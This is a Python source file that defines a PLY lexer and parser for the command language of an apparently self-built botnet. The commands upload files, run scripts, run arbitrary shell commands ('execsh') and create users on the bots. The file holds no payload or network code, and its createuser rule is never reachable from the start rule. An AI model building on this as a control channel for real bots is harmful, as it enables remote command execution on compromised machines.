#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# An EBNF-style parser for the language known by the botnet
#
# Author: Dan Garant
# Created: 08/06/12
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import re
import ply.lex as lex
import ply.yacc as yacc
import curses.ascii

class Lexer:
    """ Lexer definitions for Ply lex """

    states = (
                ('file', 'exclusive'),
             )

    tokens = (
              'PING',
              'EXEC',
              'EXECSH',
              'PUT',
              'FILESTR',
              'STRING',
              'CREATEUSER'
             )

    t_ignore = ' \t'
    t_PING = 'ping'
    t_EXEC = 'exec'
    t_EXECSH = 'execsh'
    t_PUT = 'put'
    t_CREATEUSER = 'createuser'

    def t_file_FILESTR(self, t):
        r'.+' 
        t.value = t.value.lstrip() # remove leading whitespace on command spec
        t.lexer.begin('INITIAL')
        return t
    
    def t_file_INITIAL_error(self, t):
        raise RuntimeError('Syntax error near "{0}"'.format(t.value[:15]))

    def t_STRING(self, t):
        r'"(?:[^"\\]|\\.)*"'
        t.value = t.value.strip('"')
        # if we parsed a string and the first token was a put, 
        # we're expecting file content next
        input_str = t.lexer.lexdata.strip()
        if re.match(self.t_PUT, input_str):
            t.lexer.begin('file')
        return t

    def build_lexer(self, debug=False):
        """ Constructs and returns the bot lexer """
        if debug:
            return lex.lex(module=self, reflags=re.DOTALL, debug=True)
        else:
            return lex.lex(module=self, reflags=re.DOTALL, debug=False, errorlog=yacc.NullLogger())
        
class Parser:
    """ Parser definitions for Ply yacc """
    def build_parser(self, debug=False):

        tokens = Lexer.tokens

        def p_start(p):
            '''start : put 
                     | exec 
                     | execsh
                     | ping'''
            p[0] = p[1]

        def p_put(p):
            'put : PUT STRING FILESTR'
            p[0] = ('put', p[2], p[3])

        def p_exec(p):
            'exec : EXEC STRING'
            p[0] = ('exec', p[2])

        def p_execsh(p):
            'execsh : EXECSH STRING'
            p[0] = ('execsh', p[2])

        def p_ping(p):
            'ping : PING'
            p[0] = ('ping',)

        def p_createuser(p):
            'createuser : CREATEUSER STRING STRING'
            p[0] = ('createuser', p[2], p[3])

        if debug:
            return yacc.yacc(debug=True)
        else:
            return yacc.yacc(errorlog = yacc.NullLogger())
        
class BotParser:
    """ Manages parsing and statement creation for the botnet"""

    def __init__(self, debug=False):
        """ Creates the bot parser"""
        self.lexer = Lexer().build_lexer(debug=debug)
        self.parser = Parser().build_parser(debug=debug)

    def create_ping_stmt(self):
        """ Creates a ping statement which 
            conforms to the bot language """
        return "ping"

    def create_put_stmt(self, script):
        """ Creates a 'put' statement which conforms to the bot language
            Arguments:
            script -- The path of the script we want to create a 'put' statement for
        """
        with open(script, 'r') as script_handle:
            file_content = script_handle.read()
        return 'put "{0}" {1}'.format(script, file_content)

    def create_exec_stmt(self, script):
        """ Creates an execute statement which conforms to the bot language
            Arguments:
            script -- The name of the script
        """
        return 'exec "{0}"'.format(script)

    def create_execsh_stmt(self, line):
        """ Creates an execute statement which conforms to the bot language
            Arguments:
            line -- The system commands to run
        """
        return 'execsh "{0}"'.format(line)

    def parse(self, content):
        """ Parses the specified content into a single command"""
        return self.parser.parse(content, lexer=self.lexer)

